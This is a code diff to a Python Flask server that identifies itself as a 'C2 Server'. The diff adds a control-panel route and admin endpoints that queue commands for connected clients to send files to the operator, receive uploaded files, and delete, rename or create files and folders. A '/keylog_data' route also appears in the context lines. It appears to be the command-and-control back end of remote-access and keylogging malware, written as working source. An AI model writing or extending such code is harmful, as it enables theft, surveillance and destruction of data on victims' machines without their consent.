@@ -416,6 +416,15 @@ def home():
     return "C2 Server Online - " + datetime.now().isoformat()
 
 
+@app.route('/control')
+def control_panel():
+    """Serve the unified control panel"""
+    try:
+        return send_from_directory('.', 'control_panel.html')
+    except FileNotFoundError:
+        return "Control panel file not found", 404
+
+
 @app.route('/dashboard')
 def dashboard():
     """Serve the old dashboard"""
@@ -816,6 +825,168 @@ def send_file_command(client_id):
     
     except Exception as e:
         return jsonify({"error": f"failed to queue file command: {e}"}), 500
+
+
+@app.route("/admin/file/download/<client_id>", methods=["POST"])
+def download_file_from_client(client_id):
+    """Télécharger un fichier depuis le client"""
+    try:
+        file_path = request.json.get('file_path')
+        if not file_path:
+            return jsonify({"error": "No file path specified"}), 400
+        
+        command_id = f"download_{int(time.time() * 1000)}"
+        command_info = {
+            "command_id": command_id,
+            "action": "download",
+            "data": {"path": file_path},
+            "timestamp": time.time()
+        }
+        pending_commands.setdefault(client_id, []).append(command_info)
+        
+        save_command_to_database(client_id, command_info)
+        
+        print(f"📥 [DOWNLOAD] Queued download request for {file_path} from {client_id}")
+        return jsonify({
+            "success": True,
+            "command_id": command_id,
+            "message": f"Download request queued"
+        })
+    
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
+
+
+@app.route("/admin/file/upload/<client_id>", methods=["POST"])
+def upload_file_to_client(client_id):
+    """Uploader un fichier vers le client"""
+    try:
+        destination = request.json.get('destination')
+        file_data = request.json.get('file_data')  # Base64 encoded
+        filename = request.json.get('filename')
+        
+        if not all([destination, file_data, filename]):
+            return jsonify({"error": "Missing required fields"}), 400
+        
+        command_id = f"upload_{int(time.time() * 1000)}"
+        command_info = {
+            "command_id": command_id,
+            "action": "upload",
+            "data": {
+                "destination": destination,
+                "file_data": file_data,
+                "filename": filename
+            },
+            "timestamp": time.time()
+        }
+        pending_commands.setdefault(client_id, []).append(command_info)
+        
+        save_command_to_database(client_id, command_info)
+        
+        print(f"📤 [UPLOAD] Queued upload request for {filename} to {client_id}")
+        return jsonify({
+            "success": True,
+            "command_id": command_id,
+            "message": f"Upload request queued"
+        })
+    
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
+
+
+@app.route("/admin/file/delete/<client_id>", methods=["POST"])
+def delete_file_on_client(client_id):
+    """Supprimer un fichier/dossier sur le client"""
+    try:
+        file_path = request.json.get('file_path')
+        if not file_path:
+            return jsonify({"error": "No file path specified"}), 400
+        
+        command_id = f"delete_{int(time.time() * 1000)}"
+        command_info = {
+            "command_id": command_id,
+            "action": "delete",
+            "data": {"path": file_path},
+            "timestamp": time.time()
+        }
+        pending_commands.setdefault(client_id, []).append(command_info)
+        
+        save_command_to_database(client_id, command_info)
+        
+        print(f"🗑️ [DELETE] Queued delete request for {file_path} on {client_id}")
+        return jsonify({
+            "success": True,
+            "command_id": command_id,
+            "message": f"Delete request queued"
+        })
+    
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
+
+
+@app.route("/admin/file/rename/<client_id>", methods=["POST"])
+def rename_file_on_client(client_id):
+    """Renommer un fichier/dossier sur le client"""
+    try:
+        old_path = request.json.get('old_path')
+        new_path = request.json.get('new_path')
+        
+        if not all([old_path, new_path]):
+            return jsonify({"error": "Missing old_path or new_path"}), 400
+        
+        command_id = f"rename_{int(time.time() * 1000)}"
+        command_info = {
+            "command_id": command_id,
+            "action": "rename",
+            "data": {
+                "old_path": old_path,
+                "new_path": new_path
+            },
+            "timestamp": time.time()
+        }
+        pending_commands.setdefault(client_id, []).append(command_info)
+        
+        save_command_to_database(client_id, command_info)
+        
+        print(f"✏️ [RENAME] Queued rename request on {client_id}")
+        return jsonify({
+            "success": True,
+            "command_id": command_id,
+            "message": f"Rename request queued"
+        })
+    
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
+
+
+@app.route("/admin/file/create_folder/<client_id>", methods=["POST"])
+def create_folder_on_client(client_id):
+    """Créer un nouveau dossier sur le client"""
+    try:
+        folder_path = request.json.get('folder_path')
+        if not folder_path:
+            return jsonify({"error": "No folder path specified"}), 400
+        
+        command_id = f"mkdir_{int(time.time() * 1000)}"
+        command_info = {
+            "command_id": command_id,
+            "action": "create_folder",
+            "data": {"path": folder_path},
+            "timestamp": time.time()
+        }
+        pending_commands.setdefault(client_id, []).append(command_info)
+        
+        save_command_to_database(client_id, command_info)
+        
+        print(f"📁 [CREATE] Queued folder creation for {folder_path} on {client_id}")
+        return jsonify({
+            "success": True,
+            "command_id": command_id,
+            "message": f"Folder creation request queued"
+        })
+    
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
 
 
 @app.route("/keylog_data", methods=["POST"])
